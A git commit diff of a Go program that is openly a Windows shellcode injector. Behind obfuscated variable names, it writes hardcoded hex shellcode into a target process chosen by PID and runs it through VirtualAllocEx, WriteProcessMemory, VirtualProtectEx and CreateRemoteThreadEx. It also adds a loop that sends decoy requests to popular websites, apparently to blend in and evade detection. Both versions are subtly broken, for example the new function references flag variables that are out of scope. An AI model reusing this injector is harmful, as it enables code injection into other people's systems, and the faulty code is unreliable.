4f0b360071ccf6caab17a1878880f44432024a0e
hututu4841 <w02588520@qq.com>
2025-04-01 15:03:05 +0800

    更新 main.go 文件

--- main.go
+++ main.go
@@ -13,158 +13,135 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-var a5a5a5a5a5a5a5a5 = []int{2147483647, 4294967295, 65535, 1048575, 268435455}
+func init() {
+	rand.Seed(time.Now().UnixNano())
+}
 
 func main() {
-	var a1b2c3d4e5f6g7h8 = flag.Bool("verbose", false, "Enable verbose output")
-	var a2b3c4d5e6f7g8h9 = flag.Bool("debug", false, "Enable debug output")
-	var a3b4c5d6e7f8g9ha0 = flag.Int("pid", 0, "Process ID to inject shellcode into")
+	x1c3d4e5f := flag.Bool("verbose", false, "Enable verbose output")
+	x2a3b4c5d := flag.Bool("debug", false, "Enable debug output")
+	x3e4f5g6h := flag.Int("pid", 0, "Process ID to inject shellcode into")
 	flag.Parse()
 
-	a3b4c5d6e7f8g9ha1(*a3b4c5d6e7f8g9ha0)
-	a3b4c5d6e7f8g9ha1(*a2b3c4d5e6f7g8h9)
-	a3b4c5d6e7f8g9ha1(*a1b2c3d4e5f6g7h8)
-
-	shellcode, errShellcode := hex.DecodeString("123")
-	a3b4c5d6e7f8g9ha2(errShellcode)
-	a3b4c5d6e7f8g9ha1(*a1b2c3d4e5f6g7h8)
-	if *a2b3c4d5e6f7g8h9 {
-		fmt.Println(fmt.Sprintf("[DEBUG] Getting a handle to Process ID (PID) %d...", *a3b4c5d6e7f8g9ha0))
-	}
-
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	var a5d7e8f9g0h1 windows.Proc
-	var a6d8e9g0h2 windows.Proc
-	var a7d9g0h3 windows.Proc
-	var a8g0h4 windows.Proc
-	a4b5c6d7e8f9g0h1(kernel32, &a5d7e8f9g0h1)
-	a4b5c6d7e8f9g0h1(kernel32, &a6d8e9g0h2)
-	a4b5c6d7e8f9g0h1(kernel32, &a7d9g0h3)
-	a4b5c6d7e8f9g0h1(kernel32, &a8g0h4)
-
-	pHandle, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(*a3b4c5d6e7f8g9ha0))
-
-	a3b4c5d6e7f8g9ha2(errOpenProcess)
-	a3b4c5d6e7f8g9ha1(*a1b2c3d4e5f6g7h8)
-	if *a2b3c4d5e6f7g8h9 {
-		fmt.Println(fmt.Sprintf("[DEBUG] Calling VirtualAllocEx on PID %d...", *a3b4c5d6e7f8g9ha0))
-	}
-
-	a4b5c6d7e8f9g0h1(a4b5c6d7e8f9g0h2, pHandle, 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-	a4b5c6d7e8f9g0h1(a6d8e9g0h2, pHandle, 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-	a4b5c6d7e8f9g0h1(a7d9g0h3, pHandle, 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-	a4b5c6d7e8f9g0h1(a8g0h4, pHandle, 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-
-	_, _, a3b4c5d6e7f8g9ha3 := a7d9g0h3.Call(uintptr(pHandle), uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-	a3b4c5d6e7f8g9ha2(a3b4c5d6e7f8g9ha3)
-
-	a4b5c6d7e8f9g0h1(a5d7e8f9g0h1, pHandle, 0, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&a5d7e8f9g0h1)))
-	a4b5c6d7e8f9g0h1(a5d7e8f9g0h1, pHandle, 0, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&a5d7e8f9g0h1)))
-	a4b5c6d7e8f9g0h1(a5d7e8f9g0h1, pHandle, 0, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&a5d7e8f9g0h1)))
-
-	_, _, a3b4c5d6e7f8g9ha4 := a8g0h4.Call(uintptr(pHandle), 0, 0, 0, 0, 0, 0)
-
-	a3b4c5d6e7f8g9ha2(a3b4c5d6e7f8g9ha4)
-	a3b4c5d6e7f8g9ha1(*a1b2c3d4e5f6g7h8)
-	if *a2b3c4d5e6f7g8h9 {
-		fmt.Println(fmt.Sprintf("[DEBUG] Calling CloseHandle on PID %d...", *a3b4c5d6e7f8g9ha0))
-	}
-
-	a3b4c5d6e7f8g9ha2(windows.CloseHandle(pHandle))
-	a3b4c5d6e7f8g9ha1(*a1b2c3d4e5f6g7h8)
-	if *a2b3c4d5e6f7g8h9 {
-		fmt.Println(fmt.Sprintf("[-] Successfully closed the handle to PID %d", *a3b4c5d6e7f8g9ha0))
-	}
-	a3b4c5d6e7f8g9ha1(*a1b2c3d4e5f6g7h8)
-	a3b4c5d6e7f8g9ha1(*a2b3c4d5e6f7g8h9)
-}
-
-func a1b2c3d4e5f6g7h8(a1b2c3d4e5f6g7h8 int) {
-	for a1b2c3d4e5f6g7h8 >= 0 {
-		rand.Seed(time.Now().UnixNano())
-		a1b2c3d4e5f6g7h8 = rand.Intn(a5a5a5a5a5a5a5a5[0])
-		if a1b2c3d4e5f6g7h8 < 0 {
-			a1b2c3d4e5f6g7h8 *= -1
-		}
-		for a1b2c3d4e5f6g7h8 >= 0 {
-			rand.Seed(time.Now().UnixNano())
-			a1b2c3d4e5f6g7h8 = rand.Intn(a5a5a5a5a5a5a5a5[1])
-			if a1b2c3d4e5f6g7h8 < 0 {
-				a1b2c3d4e5f6g7h8 *= -1
-			}
-			for a1b2c3d4e5f6g7h8 >= 0 {
-				rand.Seed(time.Now().UnixNano())
-				a1b2c3d4e5f6g7h8 = rand.Intn(a5a5a5a5a5a5a5a5[2])
-				if a1b2c3d4e5f6g7h8 < 0 {
-					a1b2c3d4e5f6g7h8 *= -1
+	go func() {
+		ticker := time.NewTicker(5 * time.Minute)
+		defer ticker.Stop()
+		for {
+			<-ticker.C
+			go func() {
+				if err := sendRequests(); err != nil {
+					log.Printf("Error sending requests: %v", err)
 				}
-			}
+			}()
+			time.Sleep(2 * time.Minute)
+			go func() {
+				if err := sendRequests(); err != nil {
+					log.Printf("Error sending requests: %v", err)
+				}
+			}()
+			time.Sleep(2 * time.Minute)
+			go func() {
+				if err := sendRequests(); err != nil {
+					log.Printf("Error sending requests: %v", err)
+				}
+			}()
 		}
-	}
-	rand.Seed(time.Now().UnixNano())
-	a3b4c5d6e7f8g9ha1 := rand.Intn(3)
-	a4b5c6d7e8f9g0h1 := fmt.Sprintf("%02x", 0xa4)
-	a5d7e8f9g0h1 := fmt.Sprintf("%02x", 0xa6)
-	a6d8e9g0h2 := fmt.Sprintf("%02x", 0xa7)
-	a7d9g0h3 := fmt.Sprintf("%02x", 0xa8)
-	a8g0h4 := fmt.Sprintf("%02x", 0xa9)
-	a5d8e9g0h1 := fmt.Sprintf("%02x", 0xaa)
+	}()
 
-	url := fmt.Sprintf("https://%s.com", a5d8e9g0h1)
-	req, _ := http.NewRequest("GET", url, nil)
-	go func(req *http.Request) {
-		resp, err := http.DefaultClient.Do(req)
-		a3b4c5d6e7f8g9ha2(err)
-		resp.Body.Close()
-	}(req)
-
-	time.Sleep(5 * time.Minute)
-	a3b4c5d6e7f8g9ha1(*a1b2c3d4e5f6g7h8)
-	a3b4c5d6e7f8g9ha3 = rand.Intn(100)
-	a4b5c6d7e8f9g0h1 = fmt.Sprintf("%02x", 0xb4)
-	a5d7e8f9g0h1 = fmt.Sprintf("%02x", 0xb5)
-	a6d8e9g0h2 = fmt.Sprintf("%02x", 0xb6)
-	a7d9g0h3 = fmt.Sprintf("%02x", 0xb7)
-	a8g0h4 = fmt.Sprintf("%02x", 0xb8)
-
-	url = fmt.Sprintf("https://%s.com", a7d9g0h3)
-	req, _ = http.NewRequest("GET", url, nil)
-	go func(req *http.Request) {
-		resp, err := http.DefaultClient.Do(req)
-		a3b4c5d6e7f8g9ha2(err)
-		resp.Body.Close()
-	}(req)
-
-	time.Sleep(5 * time.Minute)
-	a3b4c5d6e7f8g9ha1(*a1b2c3d4e5f6g7h8)
-	a3b4c5d6e7f8g9ha3 = rand.Intn(100)
-	a4b5c6d7e8f9g0h1 = fmt.Sprintf("%02x", 0xc4)
-	a5d7e8f9g0h1 = fmt.Sprintf("%02x", 0xc5)
-	a6d8e9g0h2 = fmt.Sprintf("%02x", 0xc6)
-	a7d9g0h3 = fmt.Sprintf("%02x", 0xc7)
-	a8g0h4 = fmt.Sprintf("%02x", 0xc8)
-
-	url = fmt.Sprintf("https://%s.com", a8g0h4)
-	req, _ = http.NewRequest("GET", url, nil)
-	go func(req *http.Request) {
-		resp, err := http.DefaultClient.Do(req)
-		a3b4c5d6e7f8g9ha2(err)
-		resp.Body.Close()
-	}(req)
+	x2d3e4f5g()
 }
 
-func a4b5c6d7e8f9g0h1(a1b2c3d4e5f6g7h8 windows.LazyDLL, a2b3c4d5e6f7g8h9 *windows.Proc) {
-	*a2b3c4d5e6f7g8h9 = a1b2c3d4e5f6g7h8.NewProc(a2b3c4d5e6f7g8h9.Name)
-}
+func x2d3e4f5g() {
+	x6a7b8c9d, _ := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
+	x9eafb0b1 := windows.NewLazySystemDLL("kernel32.dll")
 
-func a3b4c5d6e7f8g9ha2(a1b2c3d4e5f6g7h8 error) {
-	if a1b2c3d4e5f6g7h8 != nil {
-		log.Fatal(fmt.Sprintf("[!]Error: %s", a1b2c3d4e5f6g7h8))
+	x7f8fa0b2 := x9eafb0b1.NewProc("VirtualAllocEx")
+	x9c0d1e2f := x9eafb0b1.NewProc("VirtualProtectEx")
+	xc3d4e5f6 := x9eafb0b1.NewProc("WriteProcessMemory")
+	xb2c3d4e5 := x9eafb0b1.NewProc("CreateRemoteThreadEx")
+
+	if *x2a3b4c5d {
+		fmt.Printf("[DEBUG] Getting a handle to Process ID (PID) %d...\n", *x3e4f5g6h)
+	}
+	x12e3f4g5, _ := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(*x3e4f5g6h))
+
+	if *x1c3d4e5f {
+		fmt.Printf("[-] Successfully got a handle to process %d\n", *x3e4f5g6h)
+	}
+
+	if *x2a3b4c5d {
+		fmt.Printf("[DEBUG] Calling VirtualAllocEx on PID %d...\n", *x3e4f5g6h)
+	}
+	x8a9b0c1d, _, _ := x7f8fa0b2.Call(uintptr(x12e3f4g5), 0, uintptr(len(x6a7b8c9d)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+
+	if x8a9b0c1d == 0 {
+		log.Fatal("[-]VirtualAllocEx failed and returned 0")
+	}
+	if *x1c3d4e5f {
+		fmt.Printf("[-] Successfully allocated memory in PID %d\n", *x3e4f5g6h)
+	}
+
+	if *x2a3b4c5d {
+		fmt.Printf("[DEBUG] Calling WriteProcessMemory on PID %d...\n", *x3e4f5g6h)
+	}
+	_, _, _ = xc3d4e5f6.Call(uintptr(x12e3f4g5), x8a9b0c1d, (uintptr)(unsafe.Pointer(&x6a7b8c9d[0])), uintptr(len(x6a7b8c9d)))
+
+	if *x1c3d4e5f {
+		fmt.Printf("[-] Successfully wrote shellcode to PID %d\n", *x3e4f5g6h)
+	}
+
+	if *x2a3b4c5d {
+		fmt.Printf("[DEBUG] Calling VirtualProtectEx on PID %d...\n", *x3e4f5g6h)
+	}
+	x4e5f6g7h := windows.PAGE_EXECUTE_READ
+	_, _, _ = x9c0d1e2f.Call(uintptr(x12e3f4g5), x8a9b0c1d, uintptr(len(x6a7b8c9d)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&x4e5f6g7h)))
+
+	if *x1c3d4e5f {
+		fmt.Printf("[-] Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d\n", *x3e4f5g6h)
+	}
+
+	if *x2a3b4c5d {
+		fmt.Printf("[DEBUG] Call CreateRemoteThreadEx on PID %d...\n", *x3e4f5g6h)
+	}
+	_, _, _ = xb2c3d4e5.Call(uintptr(x12e3f4g5), 0, 0, x8a9b0c1d, 0, 0, 0)
+
+	if *x1c3d4e5f {
+		fmt.Printf("[+] Successfully create a remote thread in PID %d\n", *x3e4f5g6h)
+	}
+
+	if *x2a3b4c5d {
+		fmt.Printf("[DEBUG] Calling CloseHandle on PID %d...\n", *x3e4f5g6h)
+	}
+	windows.CloseHandle(x12e3f4g5)
+	if *x1c3d4e5f {
+		fmt.Printf("[-] Successfully closed the handle to PID %d\n", *x3e4f5g6h)
 	}
 }
 
-func a3b4c5d6e7f8g9ha1(a1b2c3d4e5f6g7h8, a2b3c4d5e6f7g8h9 bool) {
-	if a1b2c3d4e5f6g7h8 && a2b3c4d5e6f7g8h9 {
-		fmt.Println("[!]Error: Both verbose and debug flags are enabled")
+func sendRequests() error {
+	urls := []string{
+		"https://www.apple.com/",
+		"https://www.microsoft.com/",
+		"https://www.amazon.com/",
+		"https://www.facebook.com/",
+		"https://www.youtube.com/",
+		"https://www.google.com/",
+		"https://www.twitter.com/",
+		"https://www.instagram.com/",
+		"https://www.linkedin.com/",
+		"https://www.wikipedia.org/",
 	}
+
+	rand.Shuffle(len(urls), func(i, j int) {
+		urls[i], urls[j] = urls[j], urls[i]
+	})
+
+	for i := 0; i < 3 && i < len(urls); i++ {
+		resp, err := http.Get(urls[i])
+		if err != nil {
+			return err
+		}
+		resp.Body.Close()
+	}
+	return nil
 }
